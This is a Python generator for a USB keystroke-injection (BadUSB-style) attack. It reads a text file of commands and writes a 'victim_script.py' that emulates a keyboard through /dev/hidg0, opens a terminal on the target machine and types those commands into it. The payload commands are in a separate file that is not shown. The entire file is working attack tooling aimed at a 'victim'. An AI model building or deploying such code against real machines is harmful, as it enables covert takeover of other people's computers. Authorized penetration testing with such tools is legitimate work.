specials = "+\"*ç%&/()=?`|@#¼½¬|¢]}´~[]{}!,;.:-_<\\>"


def letter_to_key(word):
    for letter in word:
        if letter.isnumeric():
            f.write(f"    write_report(_.number[\"{letter}\"])\n")
            f.write("    write_report(_.operation[\"release\"])\n")
            f.write("    sleep(0.1)\n\n")

        elif letter in specials:
            f.write(f"    write_report(_.special_key[\"{letter}\"])\n")
            f.write("    write_report(_.operation[\"release\"])\n")
            f.write("    sleep(0.1)\n\n")

        elif letter.islower():
            f.write(f"    write_report(_.lowercase[\"{letter}\"])\n")
            f.write("    write_report(_.operation[\"release\"])\n")
            f.write("    sleep(0.1)\n\n")

        elif letter.isupper():
            f.write(f"    write_report(_.uppercase[\"{letter}\"])\n")
            f.write("    write_report(_.operation[\"release\"])\n")
            f.write("    sleep(0.1)\n\n")

    f.write("    write_report(_.special_key[\"space\"])\n")
    f.write("    write_report(_.operation[\"release\"])\n")
    f.write("    sleep(0.1)\n\n")
    return "lets buckling go"


with open('victim_script.py', 'x') as f:
    f.write("#!/usr/bin/env python3\n\n")
    f.write("from time import sleep\nimport keys_ch_keyboard as _\nfrom os import name as OS\n\n")
    f.write("sleep(5)\n\nNULL_CHAR = chr(0)\n\n\n")
    f.write("def write_report(report):\n    with open('/dev/hidg0', 'rb+') as fd:\n         fd.write(report.encode())\n\n\n")
    f.write("if OS == 'posix':\n")
    f.write("    write_report(_.operation[\"release\"])\n")
    f.write("    write_report(_.operation[\"terminal_linux\"])\n")
    f.write("    write_report(_.operation[\"release\"])\n")
    f.write("    sleep(2)\n\n")
    with open('raw_script_posix.txt', 'r') as rsf:
        lines = rsf.readlines()
        for line in lines:
            words = line.split(" ")
            for word in words:
                if "\n" in word:
                    letter_to_key(word.strip("\n"))
                    f.write("    write_report(_.special_key[\"enter\"])\n")
                    f.write("    write_report(_.operation[\"release\"])\n\n")
                    f.write("    sleep(0.5)\n\n")
                else:
                    letter_to_key(word)






